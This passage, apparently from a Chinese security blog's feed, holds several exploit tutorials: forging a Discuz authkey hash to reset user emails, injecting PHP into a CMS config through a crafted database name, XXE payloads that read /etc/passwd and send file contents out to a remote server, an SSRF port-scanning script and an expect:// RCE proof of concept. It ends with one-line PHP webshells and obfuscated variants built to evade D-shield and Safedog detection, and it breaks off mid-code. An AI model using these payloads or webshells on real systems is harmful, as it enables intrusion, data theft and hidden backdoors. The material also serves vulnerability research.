double-quoted-string">"3\ttest@test.com\t1593556905"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'ENCODE'</span><span class="token punctuation">,</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"c0dc85pjkmNEfXuw"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2014%2014%2026%2045.png" alt="20200514142645"></p><p>直接用这个hash就可重置uid为3的用户的邮件地址：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2005%2014%2014%2025%2057.png" alt="20200514142557"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>获取authkey之后对前台用户影响巨大，例如我们仅靠authkey就可以修改所有用户的邮件地址，另外前台cookie，多个点的验证中都涉及到了authkey。至于如何依靠authkey来达到更进一步的利用，各位可继续进行探索。另外强烈推荐看这篇关于Discuz漏洞的总结文章<a href="https://paper.seebug.org/1144/">这是一篇“不一样”的真实渗透测试案例分析文章</a></p><p>文中所用到的代码在：<a href="https://github.com/handbye/DiscuzX3.3-authkey-blasting">github</a>,请自取。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://lorexxar.cn/2017/08/31/dz-authkey/">Discuz_X authkey安全性漏洞分析</a></li><li><a href="https://www.anquanke.com/post/id/86679">Discuz X3.3补丁安全分析</a></li><li><a href="https://paper.seebug.org/1144/">这是一篇“不一样”的真实渗透测试案例分析文章</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Discuz </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一处有趣的php文件写入导致的getshell</title>
      <link href="2020/04/28/php-file-write/"/>
      <url>2020/04/28/php-file-write/</url>
      
        <content type="html"><![CDATA[<p>在审计一个名为熊海CMS的时候，发现了一处比较有趣的文件写入导致的getshell，所以记录一下分享出来。虽然利用条件有些鸡肋，但在遇到CMS安装页未删除并且可以重复安装的情况下倒是一个getshell的思路。</p><p>关键代码如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">include '../inc/db.class.php';$db = new DBManage ( $dbhost, $dbuser, $dbpwd, $dbname, 'utf8' );$db->restore ('seacms.sql');$content = "<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>\<span class="token variable">$DB_HOST</span><span class="token operator">=</span><span class="token string single-quoted-string">'".$dbhost."'</span><span class="token punctuation">;</span>\<span class="token variable">$DB_USER</span><span class="token operator">=</span><span class="token string single-quoted-string">'".$dbuser."'</span><span class="token punctuation">;</span>\<span class="token variable">$DB_PWD</span><span class="token operator">=</span><span class="token string single-quoted-string">'".$dbpwd."'</span><span class="token punctuation">;</span>\<span class="token variable">$DB_NAME</span><span class="token operator">=</span><span class="token string single-quoted-string">'".$dbname."'</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>";$of = fopen('../inc/conn.info.php','w');if($of)&#123; fwrite($of,$content);&#125;echo "MySQL数据库连接配置成功!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在安装时，会将数据库名，用户，密码等写入<code>db.class.php</code>文件，那就可以构造数据库名来getshell了。</p><p>我们可将数据库的名称改为：<code>&#39;;phpinfo();//</code>  （经测试，mysql的数据名是可以有任意字符的）这样在安装时写入到<code>db.calss.php</code>的文件就变成了如下的样子：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2004%2029%2014%2056%2038.png" alt="20200429145638"></p><p>这样直接访问安装后的CMS首页就可以执行写入的php代码了，因为不管哪个页面都引用了<code>db.class.php</code>这个配置文件。</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2004%2029%2015%2007%2038.png" alt="20200429150738"></p><p>如果是黑盒测试的话就需要不断尝试数据库名的payload，因为不同CMS写入配置文件时的格式不同。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 漏洞挖掘 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> getshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP XXE 利用过程演示</title>
      <link href="2020/03/16/php-xxe/"/>
      <url>2020/03/16/php-xxe/</url>
      
        <content type="html"><![CDATA[<h2 id="XXE简介"><a href="#XXE简介" class="headerlink" title="XXE简介"></a>XXE简介</h2><p>在理解什么是XXE之前首先要知道什么是XML，XXE的全称为XML External Entity Injection，就是XML外部实体注入。XML是一种通用的数据交换语言，当处理数据时没有限制外部实体的使用，就可能会导致攻击者构造XML外部实体达到窃取数据，命令执行，钓鱼等行为。关于XML和XXE的详细介绍请查看<a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a>，本文重点通过实验介绍PHP XXE的几种利用。<br>本次演示使用的环境为：<a href="https://github.com/vulhub/vulhub/tree/master/php/php_xxe">https://github.com/vulhub/vulhub/tree/master/php/php_xxe</a></p><h2 id="获取敏感信息"><a href="#获取敏感信息" class="headerlink" title="获取敏感信息"></a>获取敏感信息</h2><p>通过XXE可以获取服务端的敏感信息，比如配置信息，系统文件，源代码等，有的环境是有回显的，有的是无回显的，有回显的相对比较容易操作。</p><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>先看源代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xml</span> <span class="token operator">=</span> <span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$xml</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload:</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">xxe</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ELEMENT</span> <span class="token attr-name">name</span> <span class="token attr-name">ANY</span> <span class="token punctuation">></span></span>&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" ></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过此paylod就可以回显/etc/passwd的内容：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20200317174048.png" alt="20200317174048.png"></p><h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>无回显的XXE利用必须借助外部服务器把回显内容带出来，这种的XXE也称为 <code>blind XXE</code>.</p><p>源代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dom</span><span class="token operator">-></span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2003%2017%2020%2011%20%7Bsecond.png" alt="202003172011{second"></p><p>如图，如果直接执行的话是没有任何回显的。可以使用http协议将请求发送到远程服务器上，从而获取文件内容。</p><p>首先在远程服务器写入一个dtd文件，例如<code>test.dtd</code>,文件内容如下：</p><blockquote><p><code>%</code> 号需要实体16进制编码为 <code>&amp;#x25;</code></p></blockquote><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">&lt;!ENTITY % int "&lt;!ENTITY <span class="token entity" title="&#x25;">&amp;#x25;</span> send SYSTEM 'http://192.168.2.1/%file;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后利用如下payload：</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">convert</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY % remote SYSTEM "http://192.168.2.1/test.dtd">%remote;%int;%send;</span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>就可以将数据外带到服务端：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2003%2017%2021%2006%20%7Bsecond.png" alt="202003172106{second"></p><p>执行逻辑大概如下：</p><p>从 payload 中能看到 连续调用了三个参数实体 <code>%remote</code>;<code>%int</code>;<code>%send</code>;，这就是我们的利用顺序，<code>%remote</code>先调用，调用后请求远程服务器上的<code>test.dtd</code> ，有点类似于将 <code>test.dtd</code>包含进来，然后 <code>%int</code> 调用 <code>test.dtd</code> 中的 <code>%file</code>, <code>%file</code> 就会去获取服务器上面的敏感文件，然后将 <code>%file</code> 的结果填入到 <code>%send</code> 以后(因为实体的值中不能有 <code>%</code>, 所以将其转成html实体编码 <code>&amp;#x25</code>;)，我们再调用 <code>%send</code>; 把我们的读取到的数据以GET请求的方式发送到我们的服务器上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>上面的两个实验中我们使用了file协议来读取文件内容或者通过http请求来外带信息，这种操作和SSRF很像，其实XXE也是SSRF攻击手法中的一种。接下来我们就演示使用SSRF探测内网主机开放端口和内网存活主机。</p><p>探测脚本如下，大家可根据实际情况修改脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">def</span> <span class="token function">build_xml</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    xml <span class="token operator">=</span> <span class="token triple-quoted-string string">"""&lt;?xml version="1.0" encoding="ISO-8859-1"?>"""</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY >"""</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;!ENTITY xxe SYSTEM """</span> <span class="token operator">+</span> <span class="token string">'"'</span> <span class="token operator">+</span> string <span class="token operator">+</span> <span class="token string">'"'</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""">]>"""</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;xml>"""</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""    &lt;stuff>&amp;xxe;&lt;/stuff>"""</span>    xml <span class="token operator">=</span> xml <span class="token operator">+</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">"""&lt;/xml>"""</span>    send_xml<span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">send_xml</span><span class="token punctuation">(</span>xml<span class="token punctuation">)</span><span class="token punctuation">:</span>    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/xml'</span><span class="token punctuation">&#125;</span>    x <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">'http://192.168.123.128:8080/dom.php'</span><span class="token punctuation">,</span> data<span class="token operator">=</span>xml<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text    coded_string <span class="token operator">=</span> x<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> coded_string<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"host"</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"主机不存活"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"主机存活，探测到的端口服务为：%s"</span><span class="token operator">%</span><span class="token punctuation">(</span>coded_string<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        i <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>        ip <span class="token operator">=</span> <span class="token string">'192.168.123.'</span> <span class="token operator">+</span> i        string <span class="token operator">=</span> <span class="token string">'php://filter/convert.base64-encode/resource=http://'</span> <span class="token operator">+</span> ip <span class="token operator">+</span> <span class="token string">':22'</span><span class="token operator">+</span><span class="token string">'/'</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span>        build_xml<span class="token punctuation">(</span>string<span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>探测结果：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2003%2018%2014%2049%20%7Bsecond.gif" alt="202003181449{second"></p><h2 id="expect-RCE"><a href="#expect-RCE" class="headerlink" title="expect RCE"></a>expect RCE</h2><p>当php安装了expect扩展后（此扩展默认未安装），攻击者就可以利用except进行远程代码执行的操作。</p><p>示例POC</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">root</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY cmd SYSTEM "expect://id"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dir</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>file</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&cmd;">&amp;cmd;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>file</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dir</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>除此外，XXE还可以造成DDOS,文件上传，钓鱼等攻击，由于环境原因，不便演示，在先知的<a href="https://xz.aliyun.com/t/3357">这篇文章</a>中作者也有详细讲解，感兴趣的可以去看。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://www.freebuf.com/articles/web/126788.html">浅谈XXE攻击</a></li><li><a href="https://www.kingkk.com/2018/07/%E7%AE%80%E6%9E%90XXE/">简析XXE</a></li><li><a href="https://thief.one/2017/06/20/1/">浅谈XXE漏洞攻击与防御</a></li><li><a href="https://xz.aliyun.com/t/3357">一篇文章带你深入理解漏洞之 XXE 漏洞</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀webshell的一些研究</title>
      <link href="2020/02/07/php-free-kill-webshell/"/>
      <url>2020/02/07/php-free-kill-webshell/</url>
      
        <content type="html"><![CDATA[<h2 id="前⾔"><a href="#前⾔" class="headerlink" title="前⾔"></a>前⾔</h2><p>webshell免杀已经是⼀个⽼⽣⻓谈的话题了，现在的各种waf都已经可以识别常⻅webshell及其各种变形，也出现了基于沙箱技术和机器学习的waf。webshell的免杀⼀直在⼀个对抗的过沉中，今天新出的⼀个免杀webshell，可能明天就加⼊了waf的规则库中，所以我们需要尽可能多的掌握webshell免杀技巧并且⾃⼰去写⼀些webshell。能够免杀的webshell尽可能的⼩范围使⽤，⼤量使⽤必然会被waf识别并加⼊查杀规则库。</p><h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><p>本次测试过程中使⽤了常⻅的两个免费waf：安全狗和D盾。综合测试的结果是D盾的免杀能⼒更强，所以能过D盾webshell基本都可以过安全狗。webshell即使可以逃过D盾的查杀，也⽆法进⾏系统的命令执⾏，因为D盾还有⼀层防⽕墙。如何绕过D盾防⽕墙和360等杀毒软件还需继续学习。</p><h2 id="webshell原理"><a href="#webshell原理" class="headerlink" title="webshell原理"></a>webshell原理</h2><p>根据功能的差别可以将webshell分为⼀句话⽊⻢，⼩⻢和⼤⻢。对于这些⻢的查杀原理基本是⼀样的，只不过代码  越多暴露的特性就会越多，⾃然就越容易被查杀。本次研究⼀句话⽊⻢的免杀，重点介绍⼀句话⽊⻢的原理。 ⼀句话⽊⻢是最简单的webshell，它的实现也相当容易，最简单的⼀句话⽊⻢如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>assert</code>可以换成<code>system</code>等可以执⾏系统命令的PHP函数。</p><p>毫⽆疑问，这中简单原始的webshell肯定会被免杀：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2003%2018%2021%2055%20%7Bsecond.png" alt="202003182155{second"></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2003%2018%2021%2056%20%7Bsecond.png" alt="202003182156{second"></p><h2 id="eval和assert"><a href="#eval和assert" class="headerlink" title="eval和assert"></a>eval和assert</h2><p>关于eval函数</p><blockquote><p>eval 是⼀个语⾔构造器⽽不是⼀个函数，不能被 可变函数 调⽤ 可变函数：通过⼀个变量，获取其对应的变量值，然后通过给该值增加⼀个括号()，让系统认为该值是⼀个函数，从⽽当做函数来执⾏</p></blockquote><p>通俗的说⽐如你<code>&lt;?php $a=eval;$a()?&gt;</code>这样是不⾏的.也造就了⽤<code>eval</code>的话达不到<code>assert</code>的灵活，但是在php7.1以上<code>assert</code>已经不能使用了。</p><p>关于assert函数</p><blockquote><p>assert()回调函数在构建⾃动测试套件的时候尤其有⽤，因为它们允许你简易地捕获传⼊断⾔的代码，并包含断⾔的位置信息。 当信息能够被其他⽅法捕获，使⽤断⾔可以让它更快更⽅便！</p></blockquote><h2 id="免杀⽅法"><a href="#免杀⽅法" class="headerlink" title="免杀⽅法"></a>免杀⽅法</h2><h3 id="函数替换"><a href="#函数替换" class="headerlink" title="函数替换"></a>函数替换</h3><p>例如将<code>$_POST</code>替换为<code>$_REQUEST</code></p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2003%2018%2022%2001%20%7Bsecond.png" alt="202003182201{second"></p><p>虽然D盾还是检测出来为后⻔，但是级别已经降低了为4级，可⻅D盾对<code>POST</code>更为敏感，这⾥显然不能免杀，但是可以作为⼀种思路来配合后续的其它⽅法免杀。</p><h3 id="字符串变形"><a href="#字符串变形" class="headerlink" title="字符串变形"></a>字符串变形</h3><p>php造作字符串的函数有：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">ucwords</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//函数把字符串中每个单词的⾸字符转换为⼤写。</span><span class="token function">ucfirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//函数把字符串中的⾸字符转换为⼤写。</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//函数从字符串的两端删除空⽩字符和其他预定义字符。</span><span class="token function">substr_replace</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//函数把字符串的⼀部分替换为另⼀个字符串</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//函数返回字符串的⼀部分。</span><span class="token function">strtr</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//函数转换字符串中特定的字符。</span><span class="token function">strtoupper</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//函数把字符串转换为⼤写。</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//函数把字符串转换为⼩写。</span><span class="token function">strtok</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//函数把字符串分割为更⼩的字符串</span><span class="token function">str_rot13</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//函数对字符串执⾏ ROT13 编码。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过字符串函数对关键字<code>assert</code>和<code>$_POST</code>进⾏变形，如：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">substr_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"assexx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"rt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2003%2018%2022%2004%20%7Bsecond.png" alt="202003182204{second"></p><p>D盾检测出为1级，其实1级D盾就不会拦截，可以达到免杀效果：</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2003%2018%2022%2005%20%7Bsecond.png" alt="202003182205{second"></p><p>经过测试，D盾只要遇到这种疑似变量就会报危险，如下图，即使这个变量是⼀个⽆害的字符串，所以在这个问题 上⽆需深究。</p><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2003%2018%2022%2006%20%7Bsecond.png" alt="202003182206{second"></p><h3 id="⾃定义函数绕过"><a href="#⾃定义函数绕过" class="headerlink" title="⾃定义函数绕过"></a>⾃定义函数绕过</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">sys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token string single-quoted-string">'al($_'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'@ev'</span><span class="token operator">.</span><span class="token function">sys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'POST[x]);'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="利⽤数组免杀"><a href="#利⽤数组免杀" class="headerlink" title="利⽤数组免杀"></a>利⽤数组免杀</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">substr_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"assexx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"rt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token string single-quoted-string">''</span><span class="token operator">=></span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2003%2018%2022%2008%20%7Bsecond.png" alt="202003182208{second"></p><p>还可以给数组加点料：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">substr_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"assexx"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"rt"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'e'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token variable">$c</span><span class="token operator">=></span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/handbye/images@master/upic/2020%2003%2018%2022%2009%20%7Bsecond.png" alt="202003182209{second"></p><p>除此外还可以使⽤多维数组：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$b</span> <span class="token operator">=</span> <span 